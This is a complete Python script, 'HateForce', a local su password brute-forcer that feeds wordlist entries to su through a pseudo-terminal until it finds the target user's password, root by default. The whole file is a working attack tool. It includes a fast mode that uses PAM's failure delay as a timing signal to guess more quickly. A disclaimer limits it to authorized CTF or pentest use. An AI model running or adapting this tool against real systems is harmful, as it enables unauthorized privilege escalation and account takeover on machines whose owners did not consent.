#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#  HateForce  -  by IHATEFW
#  Local su/sudo password brute-forcer for authorized privilege-escalation
#  testing (CTF / pentest engagements). Tests passwords against the LOCAL
#  machine's `su` only. Use only on systems you own or are authorized to test.
#
import argparse
import os
import pty
import select
import signal
import sys
import time

# ----------------------------------------------------------------------------
# Colors
# ----------------------------------------------------------------------------
class C:
    R = "\033[91m"   # red
    G = "\033[92m"   # green
    Y = "\033[93m"   # yellow
    B = "\033[94m"   # blue
    M = "\033[95m"   # magenta
    CY = "\033[96m"  # cyan
    W = "\033[97m"   # white
    GREY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    # 256-color shades for the red -> orange -> purple banner gradient
    RED = "\033[38;5;196m"
    ORANGE = "\033[38;5;208m"
    ORANGE2 = "\033[38;5;202m"
    PURPLE = "\033[38;5;135m"
    PURPLE2 = "\033[38;5;99m"

    @staticmethod
    def strip():
        for k in ("R", "G", "Y", "B", "M", "CY", "W", "GREY", "BOLD", "DIM",
                  "RESET", "RED", "ORANGE", "ORANGE2", "PURPLE", "PURPLE2"):
            setattr(C, k, "")


# ----------------------------------------------------------------------------
# Banner
# ----------------------------------------------------------------------------
# "HATEFORCE" (figlet standard)
BANNER = [
    r" _   _    _  _____ _____ _____ ___  ____   ____ _____ ",
    r"| | | |  / \|_   _| ____|  ___/ _ \|  _ \ / ___| ____|",
    r"| |_| | / _ \ | | |  _| | |_ | | | | |_) | |   |  _|  ",
    r"|  _  |/ ___ \| | | |___|  _|| |_| |  _ <| |___| |___ ",
    r"|_| |_/_/   \_\_| |_____|_|   \___/|_| \_\\____|_____|",
]

# "By IHATEFW" (figlet small)
AUTHOR = [
    r" ___        ___ _  _   _ _____ ___ _____      __",
    r"| _ )_  _  |_ _| || | /_\_   _| __| __\ \    / /",
    r"| _ \ || |  | || __ |/ _ \| | | _|| _| \ \/\/ / ",
    r"|___/\_, | |___|_||_/_/ \_\_| |___|_|   \_/\_/  ",
    r"     |__/",
]

# red -> orange -> purple, one shade per banner line
BANNER_COLORS = [C.RED, C.ORANGE2, C.ORANGE, C.PURPLE, C.PURPLE2]


def print_banner(user, wordlist, total):
    print()
    for line, col in zip(BANNER, BANNER_COLORS):
        print("  " + col + C.BOLD + line + C.RESET)
    print()
    for line in AUTHOR:
        print("  " + C.PURPLE + C.BOLD + line + C.RESET)
    print()
    print(C.GREY + "  Local privilege-escalation brute-forcer  ·  authorized use only" + C.RESET)
    print(C.GREY + "  " + "-" * 62 + C.RESET)
    print(f"  {C.CY}Target user {C.RESET}: {C.W}{C.BOLD}{user}{C.RESET}")
    print(f"  {C.CY}Wordlist    {C.RESET}: {C.W}{wordlist}{C.RESET}")
    print(f"  {C.CY}Passwords   {C.RESET}: {C.W}{total}{C.RESET}")
    print(C.GREY + "  " + "-" * 62 + C.RESET)
    print()


# ----------------------------------------------------------------------------
# Progress bar
# ----------------------------------------------------------------------------
def progress(done, total, start, current, width=32):
    frac = done / total if total else 1.0
    filled = int(width * frac)
    bar = C.G + "█" * filled + C.GREY + "░" * (width - filled) + C.RESET
    pct = frac * 100
    elapsed = time.time() - start
    rate = done / elapsed if elapsed > 0 else 0
    eta = (total - done) / rate if rate > 0 else 0
    shown = current if len(current) <= 18 else current[:15] + "..."
    sys.stdout.write(
        f"\r  {C.Y}[{C.RESET}{bar}{C.Y}]{C.RESET} "
        f"{C.W}{pct:5.1f}%{C.RESET} "
        f"{C.DIM}{done}/{total}{C.RESET} "
        f"{C.CY}{rate:4.0f}/s{C.RESET} "
        f"{C.DIM}eta {eta:4.0f}s{C.RESET} "
        f"{C.M}try:{C.RESET} {C.W}{shown:<18}{C.RESET}"
    )
    sys.stdout.flush()


# ----------------------------------------------------------------------------
# Core: test a single password against local `su`
# ----------------------------------------------------------------------------
def try_password(user, password, timeout=5.0):
    """
    Spawn `su <user> -c true` in a pseudo-terminal, feed the password,
    and return (success, timed_out).

    success   -> True only when su authenticated and exited 0.
    timed_out -> True when the attempt was killed at the timeout before a
                 verdict. In --fast mode this is treated as a (probable)
                 failure, but it is reported so you know which attempts
                 were inconclusive.
    """
    pid, fd = pty.fork()
    if pid == 0:
        # Child: become a clean su invocation.
        env = dict(os.environ)
        env["LC_ALL"] = "C"
        os.execvpe("su", ["su", user, "-c", "true"], env)
        os._exit(127)  # exec failed

    # Parent
    sent = False
    buf = b""
    deadline = time.time() + timeout
    try:
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                _kill(pid, fd)
                return False, True
            r, _, _ = select.select([fd], [], [], remaining)
            if fd in r:
                try:
                    chunk = os.read(fd, 1024)
                except OSError:
                    break
                if not chunk:
                    break
                buf += chunk
                low = buf.lower()
                if not sent and b"password" in low:
                    os.write(fd, password.encode(errors="ignore") + b"\n")
                    sent = True
                    buf = b""  # reset so we don't re-match the prompt echo
    except OSError:
        pass
    finally:
        try:
            os.close(fd)
        except OSError:
            pass

    # Reap and inspect exit status: su returns 0 only on success + `true`.
    try:
        _, status = os.waitpid(pid, 0)
    except OSError:
        return False, False
    ok = os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0
    return ok, False


def _kill(pid, fd):
    try:
        os.kill(pid, signal.SIGKILL)
    except OSError:
        pass
    try:
        os.waitpid(pid, 0)
    except OSError:
        pass
    try:
        os.close(fd)
    except OSError:
        pass


# ----------------------------------------------------------------------------
# Wordlist loading
# ----------------------------------------------------------------------------
def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.rstrip("\n\r") for line in f]
    except FileNotFoundError:
        sys.exit(f"{C.R}[!] Wordlist not found: {path}{C.RESET}")
    except PermissionError:
        sys.exit(f"{C.R}[!] Cannot read wordlist: {path}{C.RESET}")


# ----------------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        prog="hateforce",
        description="HateForce - local su password brute-forcer (authorized use only)",
    )
    parser.add_argument("-u", "--user", default="root", help="target user (default: root)")
    parser.add_argument("-w", "--wordlist", required=True, help="path to password wordlist")
    parser.add_argument("-t", "--timeout", type=float, default=5.0,
                        help="per-attempt timeout in seconds (default: 5)")
    parser.add_argument("-d", "--delay", type=float, default=0.0,
                        help="delay between attempts in seconds (default: 0)")
    parser.add_argument("--fast", action="store_true",
                        help="fast mode: short 0.4s timeout exploiting PAM's "
                             "fail-delay (lento=fallo). Much faster but may miss "
                             "a valid password on slow/loaded machines.")
    parser.add_argument("--no-color", action="store_true", help="disable colored output")
    args = parser.parse_args()

    # --fast lowers the timeout unless the user set one explicitly.
    fast = args.fast
    if fast and args.timeout == 5.0:
        args.timeout = 0.4

    if args.no_color or not sys.stdout.isatty():
        C.strip()

    passwords = load_wordlist(args.wordlist)
    # Drop trailing empty lines but keep an intentional empty-password attempt only if present early.
    while passwords and passwords[-1] == "":
        passwords.pop()
    total = len(passwords)
    if total == 0:
        sys.exit(f"{C.R}[!] Wordlist is empty.{C.RESET}")

    print_banner(args.user, args.wordlist, total)

    if fast:
        print(f"  {C.Y}[fast] timeout={args.timeout}s — 'lento = fallo'. "
              f"Puede perder una clave válida en máquinas lentas.{C.RESET}\n")

    start = time.time()
    found = None
    inconclusive = 0
    try:
        for i, pw in enumerate(passwords, 1):
            progress(i, total, start, pw)
            ok, timed_out = try_password(args.user, pw, timeout=args.timeout)
            if ok:
                found = pw
                break
            if timed_out:
                inconclusive += 1
            if args.delay:
                time.sleep(args.delay)
    except KeyboardInterrupt:
        print(f"\n\n  {C.Y}[~] Interrupted by user.{C.RESET}\n")
        sys.exit(130)

    print("\n")
    elapsed = time.time() - start
    if found is not None:
        shown = found if found != "" else "(empty password)"
        print(f"  {C.G}{C.BOLD}[+] PASSWORD FOUND{C.RESET}")
        print(f"  {C.G}╔{'═' * 50}╗{C.RESET}")
        print(f"  {C.G}║{C.RESET}  user: {C.W}{C.BOLD}{args.user}{C.RESET}")
        print(f"  {C.G}║{C.RESET}  pass: {C.W}{C.BOLD}{shown}{C.RESET}")
        print(f"  {C.G}╚{'═' * 50}╝{C.RESET}")
        print(f"\n  {C.GREY}Done in {elapsed:.1f}s{C.RESET}\n")
        sys.exit(0)
    else:
        print(f"  {C.R}[-] No valid password found in wordlist.{C.RESET}")
        print(f"  {C.GREY}Tried {total} passwords in {elapsed:.1f}s{C.RESET}")
        if fast and inconclusive:
            print(f"  {C.Y}[!] {inconclusive} attempt(s) timed out (inconclusive). "
                  f"Re-run without --fast to be sure.{C.RESET}")
        print()
        sys.exit(1)


if __name__ == "__main__":
    main()
